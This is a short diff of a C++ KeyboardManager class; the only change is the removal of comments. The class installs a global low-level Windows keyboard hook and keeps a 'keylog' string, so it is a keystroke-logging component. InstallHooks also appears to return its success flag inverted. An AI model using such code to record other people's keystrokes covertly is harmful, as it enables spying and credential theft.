@@ -11,13 +11,11 @@
 
 #include "KeyboardManager.h"
 
-// KeyboardManager constructor
 KeyboardManager::KeyboardManager()
 	: eHook(NULL)
 	, keylog("")
 { }
 
-// Handles key presses and releases
 LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	if (nCode < 0)
@@ -56,7 +54,6 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
-// Begins logging keystrokes
 bool KeyboardManager::InstallHooks()
 {
 	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, GetModuleHandle(NULL), 0);
@@ -65,7 +62,6 @@ bool KeyboardManager::InstallHooks()
 	return eHook == NULL;
 }
 
-// Stops logging keystrokes
 bool KeyboardManager::UninstallHooks()
 {
 	BOOL b = UnhookWindowsHookEx(eHook);
